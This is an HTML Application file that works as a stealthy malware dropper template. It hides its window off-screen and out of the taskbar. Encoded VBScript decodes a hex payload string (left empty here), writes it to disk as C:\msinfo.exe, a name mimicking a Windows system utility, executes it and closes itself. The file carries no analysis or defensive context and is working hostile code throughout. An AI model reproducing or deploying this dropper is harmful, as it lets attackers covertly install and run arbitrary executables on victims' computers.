<html><head>
<hta:application id=hta_note_id
 applicationName=hta_note_name
 showInTaskBar=no
 caption=no
 innerBorder=no
 selection=no
 scroll=no
 contextmenu=no />
<script language=JScript.Encode>
	window.moveTo(5000, 0);
</script>
</head>
<body>
<script language="VBScript.Encode" type="text/VBScript.Encode">

c0 = ""

	h0 = ""    	
    	i = 1
    	Do While i < Len(c0)
		h0 = h0 & chr(cint("&h" & mid(c0, i, 2)))
        	i = i + 2
    	Loop

	set wsh = CreateObject("WScript.Shell")
	path = "C:\\"
	set fs = CreateObject("Scripting.FileSystemObject")
	set ts = fs.CreateTextFile(path + "msinfo.exe", true, false)
   	ts.Write(h0)
   	ts.Close()
	wsh.Run(path + "msinfo.exe")
self.close()
</script>
</body></html>